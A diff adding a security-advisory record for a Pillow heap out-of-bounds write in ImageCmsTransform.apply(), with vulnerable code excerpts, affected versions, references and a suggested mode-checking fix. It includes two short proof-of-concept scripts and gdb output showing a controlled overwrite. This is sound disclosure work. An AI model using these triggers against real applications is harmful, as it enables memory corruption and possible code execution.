@@ -1,0 +1,339 @@
+advisory_id: GHSA-9hw9-ch79-4vh6
+datasource_id: github_osv/GHSA-9hw9-ch79-4vh6
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-9hw9-ch79-4vh6/GHSA-9hw9-ch79-4vh6.json
+aliases:
+  - CVE-2026-59205
+summary: |
+  Pillow: Controlled heap out-of-bounds write in Pillow `ImageCmsTransform.apply()` via output mode mismatch
+  ### Summary
+
+  Pillow's public `ImageCms.ImageCmsTransform.apply(im, imOut)` API can trigger
+  controlled native heap corruption when the caller supplies an output image whose
+  mode does not match the transform's declared output mode.
+
+  For example, a transform built as `RGBA -> RGBA` can be applied to an `L` output
+  image. Pillow checks dimensions only, then calls LittleCMS with the output row
+  pointer. LittleCMS writes RGBA-sized rows into a 1-byte-per-pixel `L` image row.
+
+  ### Details
+
+  `src/PIL/ImageCms.py:ImageCmsTransform.apply()` accepts an optional caller
+  supplied `imOut`:
+
+  ```python
+  def apply(self, im, imOut=None):
+      if imOut is None:
+          imOut = Image.new(self.output_mode, im.size, None)
+      self.transform.apply(im.getim(), imOut.getim())
+      imOut.info["icc_profile"] = self.output_profile.tobytes()
+      return imOut
+  ```
+
+  If `imOut` is provided, Pillow does not check:
+
+  ```text
+  im.mode == self.input_mode
+  imOut.mode == self.output_mode
+  ```
+
+  The C wrapper in `src/_imagingcms.c` unwraps both image cores and only checks
+  that the output dimensions are at least as large as the input dimensions:
+
+  ```c
+  static int
+  pyCMSdoTransform(Imaging im, Imaging imOut, cmsHTRANSFORM hTransform) {
+      if (im->xsize > imOut->xsize || im->ysize > imOut->ysize) {
+          return -1;
+      }
+
+      for (i = 0; i < im->ysize; i++) {
+          cmsDoTransform(hTransform, im->image[i], imOut->image[i], im->xsize);
+      }
+
+      pyCMScopyAux(hTransform, imOut, im);
+      return 0;
+  }
+  ```
+
+  `findLCMStype()` maps `RGB`, `RGBA`, and `RGBX` transform modes to LittleCMS
+  `TYPE_RGBA_8`, which writes 4 bytes per pixel:
+
+  ```c
+  case IMAGING_MODE_RGB:
+  case IMAGING_MODE_RGBA:
+  case IMAGING_MODE_RGBX:
+      return TYPE_RGBA_8;
+  ```
+
+  So with a transform declared as `RGBA -> RGBA`, LittleCMS writes `4 * width`
+  bytes to each output row. If the supplied output image is mode `L`, Pillow only
+  allocated `1 * width` bytes for that row.
+
+  For width 4096:
+
+  ```text
+  destination row allocation: 4096 bytes
+  LittleCMS write size:       16384 bytes
+  overflow:                  ~12288 bytes past the row
+  ```
+
+  The bug does not require a large image. Width 8 was enough to corrupt heap
+  metadata. At width 8, `apply()` returned to Python and printed `after`; glibc
+  detected the corrupted heap later during cleanup.
+
+  ### PoC
+
+  Tiny heap corruption trigger:
+
+  ```python
+  from PIL import Image, ImageCms
+
+  srgb = ImageCms.createProfile("sRGB")
+  transform = ImageCms.buildTransform(srgb, srgb, "RGBA", "RGBA")
+
+  im = Image.new("RGBA", (8, 1), (0x41, 0x42, 0x43, 0x44))
+  out = Image.new("L", (8, 1), 0)
+
+  print("before", flush=True)
+  transform.apply(im, out)
+  print("after")
+  ```
+
+  Observed locally on Pillow `12.3.0.dev0`:
+
+  ```text
+  before
+  after
+  free(): invalid next size (normal)
+  Aborted (core dumped)
+  ```
+
+  Controlled overwrite evidence PoC:
+
+  ```python
+  from PIL import Image, ImageCms
+
+  srgb = ImageCms.createProfile("sRGB")
+  transform = ImageCms.buildTransform(srgb, srgb, "RGBA", "RGBA")
+
+  im = Image.new("RGBA", (4096, 1), (0x41, 0x42, 0x43, 0x44))
+  out = Image.new("L", (4096, 1), 0)
+
+  transform.apply(im, out)
+  ```
+
+  Run under gdb:
+
+  ```bash
+  gdb -q --batch -ex run -ex bt --args \
+    python3 b022_controlled.py
+  ```
+
+  Observed on Pillow `12.3.0.dev0`:
+
+  ```text
+  Program received signal SIGSEGV, Segmentation fault.
+  ___pthread_mutex_lock (mutex=mutex@entry=0x4443424144434241)
+  #1 _cmsLockPrimitive (m=0x4443424144434241)
+  #2 defMtxLock (id=0x4443424144434241, mtx=0x4443424144434241)
+  #3 _cmsLockMutex (ContextID=0x4443424144434241, mtx=0x4443424144434241)
+  #4 cmsSaveProfileToIOhandler(...)
+  #5 cmsSaveProfileToMem(...)
+  #6 cms_profile_tobytes (...) at src/_imagingcms.c:152
+  ```
+
+  `0x4443424144434241` is the attacker-controlled source pixel pattern
+  `b"ABCDABCD"` interpreted as a little-endian pointer-sized value.
+
+  Using source pixels `(1, 2, 3, 4)` similarly produced a faulting pointer of
+  `0x403020104030201`, matching the repeated pixel bytes.
+
+  ### Impact
+
+  This is a heap out-of-bounds write in Pillow's native ImageCms extension,
+  reachable through public API.
+
+  Applications are impacted if untrusted users can control ImageCms transform
+  parameters and/or provide the output image object passed to
+  `ImageCmsTransform.apply()`. The source image pixels influence the bytes written
+  out of bounds.
+
+  ## Suggested fix
+
+  Validate modes before calling into the native transform:
+
+  ```python
+  def apply(self, im, imOut=None):
+      if im.mode != self.input_mode:
+          raise ValueError("input mode mismatch")
+      if imOut is None:
+          imOut = Image.new(self.output_mode, im.size, None)
+      elif imOut.mode != self.output_mode:
+          raise ValueError("output mode mismatch")
+      self.transform.apply(im.getim(), imOut.getim())
+      imOut.info["icc_profile"] = self.output_profile.tobytes()
+      return imOut
+  ```
+
+  The C extension should also defensively reject mismatched image modes before
+  calling `cmsDoTransform()`.
+impacted_packages:
+  - purl: pkg:pypi/pillow
+    affected_versions: vers:pypi/<12.3.0
+    fixed_versions: vers:pypi/12.3.0
+    affected_packages:
+      - pkg:pypi/pillow@1.0
+      - pkg:pypi/pillow@1.1
+      - pkg:pypi/pillow@1.2
+      - pkg:pypi/pillow@1.3
+      - pkg:pypi/pillow@1.4
+      - pkg:pypi/pillow@1.5
+      - pkg:pypi/pillow@1.6
+      - pkg:pypi/pillow@1.7.0
+      - pkg:pypi/pillow@1.7.1
+      - pkg:pypi/pillow@1.7.2
+      - pkg:pypi/pillow@1.7.3
+      - pkg:pypi/pillow@1.7.4
+      - pkg:pypi/pillow@1.7.5
+      - pkg:pypi/pillow@1.7.6
+      - pkg:pypi/pillow@1.7.7
+      - pkg:pypi/pillow@1.7.8
+      - pkg:pypi/pillow@2.0.0
+      - pkg:pypi/pillow@2.1.0
+      - pkg:pypi/pillow@2.2.0
+      - pkg:pypi/pillow@2.2.1
+      - pkg:pypi/pillow@2.2.2
+      - pkg:pypi/pillow@2.3.0
+      - pkg:pypi/pillow@2.3.1
+      - pkg:pypi/pillow@2.3.2
+      - pkg:pypi/pillow@2.4.0
+      - pkg:pypi/pillow@2.5.0
+      - pkg:pypi/pillow@2.5.1
+      - pkg:pypi/pillow@2.5.2
+      - pkg:pypi/pillow@2.5.3
+      - pkg:pypi/pillow@2.6.0
+      - pkg:pypi/pillow@2.6.1
+      - pkg:pypi/pillow@2.6.2
+      - pkg:pypi/pillow@2.7.0
+      - pkg:pypi/pillow@2.8.0
+      - pkg:pypi/pillow@2.8.1
+      - pkg:pypi/pillow@2.8.2
+      - pkg:pypi/pillow@2.9.0
+      - pkg:pypi/pillow@3.0.0
+      - pkg:pypi/pillow@3.1.0rc1
+      - pkg:pypi/pillow@3.1.0
+      - pkg:pypi/pillow@3.1.1
+      - pkg:pypi/pillow@3.1.2
+      - pkg:pypi/pillow@3.2.0
+      - pkg:pypi/pillow@3.3.0
+      - pkg:pypi/pillow@3.3.1
+      - pkg:pypi/pillow@3.3.2
+      - pkg:pypi/pillow@3.3.3
+      - pkg:pypi/pillow@3.4.0
+      - pkg:pypi/pillow@3.4.1
+      - pkg:pypi/pillow@3.4.2
+      - pkg:pypi/pillow@4.0.0
+      - pkg:pypi/pillow@4.1.0
+      - pkg:pypi/pillow@4.1.1
+      - pkg:pypi/pillow@4.2.0
+      - pkg:pypi/pillow@4.2.1
+      - pkg:pypi/pillow@4.3.0
+      - pkg:pypi/pillow@5.0.0
+      - pkg:pypi/pillow@5.1.0
+      - pkg:pypi/pillow@5.2.0
+      - pkg:pypi/pillow@5.3.0
+      - pkg:pypi/pillow@5.4.0.dev0
+      - pkg:pypi/pillow@5.4.0
+      - pkg:pypi/pillow@5.4.1
+      - pkg:pypi/pillow@6.0.0
+      - pkg:pypi/pillow@6.1.0
+      - pkg:pypi/pillow@6.2.0
+      - pkg:pypi/pillow@6.2.1
+      - pkg:pypi/pillow@6.2.2
+      - pkg:pypi/pillow@7.0.0
+      - pkg:pypi/pillow@7.1.0
+      - pkg:pypi/pillow@7.1.1
+      - pkg:pypi/pillow@7.1.2
+      - pkg:pypi/pillow@7.2.0
+      - pkg:pypi/pillow@8.0.0
+      - pkg:pypi/pillow@8.0.1
+      - pkg:pypi/pillow@8.1.0
+      - pkg:pypi/pillow@8.1.1
+      - pkg:pypi/pillow@8.1.2
+      - pkg:pypi/pillow@8.2.0
+      - pkg:pypi/pillow@8.3.0
+      - pkg:pypi/pillow@8.3.1
+      - pkg:pypi/pillow@8.3.2
+      - pkg:pypi/pillow@8.4.0
+      - pkg:pypi/pillow@9.0.0
+      - pkg:pypi/pillow@9.0.1
+      - pkg:pypi/pillow@9.1.0
+      - pkg:pypi/pillow@9.1.1
+      - pkg:pypi/pillow@9.2.0
+      - pkg:pypi/pillow@9.3.0
+      - pkg:pypi/pillow@9.4.0
+      - pkg:pypi/pillow@9.5.0
+      - pkg:pypi/pillow@10.0.0
+      - pkg:pypi/pillow@10.0.1
+      - pkg:pypi/pillow@10.1.0
+      - pkg:pypi/pillow@10.2.0
+      - pkg:pypi/pillow@10.3.0
+      - pkg:pypi/pillow@10.4.0
+      - pkg:pypi/pillow@11.0.0
+      - pkg:pypi/pillow@11.1.0
+      - pkg:pypi/pillow@11.2.1
+      - pkg:pypi/pillow@11.3.0
+      - pkg:pypi/pillow@12.0.0
+      - pkg:pypi/pillow@12.1.0
+      - pkg:pypi/pillow@12.1.1
+      - pkg:pypi/pillow@12.2.0
+    fixed_packages:
+      - pkg:pypi/pillow@12.3.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/python-pillow/pillow
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/python-pillow/pillow
+        commit: a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-9hw9-ch79-4vh6/GHSA-9hw9-ch79-4vh6.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-787
+references:
+  - url: https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3453.yaml
+    reference_type:
+    reference_id:
+  - url: https://github.com/python-pillow/Pillow
+    reference_type:
+    reference_id:
+  - url: https://github.com/python-pillow/Pillow/releases/tag/12.3.0
+    reference_type: other
+    reference_id: 12.3.0
+  - url: https://github.com/python-pillow/Pillow/pull/9715
+    reference_type: other
+    reference_id: 9715
+  - url: https://github.com/python-pillow/Pillow/commit/a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721
+    reference_type: other
+    reference_id: a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-59205
+    reference_type:
+    reference_id: CVE-2026-59205
+  - url: https://github.com/python-pillow/Pillow/security/advisories/GHSA-9hw9-ch79-4vh6
+    reference_type: other
+    reference_id: GHSA-9hw9-ch79-4vh6
+exploits: []
